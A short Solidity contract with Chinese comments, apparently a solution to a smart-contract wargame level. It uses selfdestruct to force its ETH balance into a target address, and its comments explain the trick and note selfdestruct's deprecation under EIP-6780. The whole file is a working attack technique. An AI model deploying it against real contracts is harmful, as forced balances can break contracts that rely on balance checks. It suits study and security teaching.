// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    // 建構函數需要是 payable 才能在部署時發送 ETH
    // 可在 javascript 使用 ethers.provider.getBalance("合約地址"); 查看合約餘額
    constructor() payable {}
    
    /*
    “selfdestruct” 已被棄用。請注意，從坎昆硬分叉開始，
    底層操作碼不再刪除與帳戶相關的代碼和數據，而只將其以太幣轉移給受益人，
    除非在創建合約的同一交易中執行（參見EIP-6780）。即使考慮到新的行為，
    也強烈不建議在新部署的合約中使用。 EVM 的未來變更可能會進一步降低操作碼的功能。
    */
    function attack_bySelfdestruct(address payable _force) public {
        // selfdestruct 會強制發送合約的所有餘額到指定地址
        selfdestruct(_force);
    }
}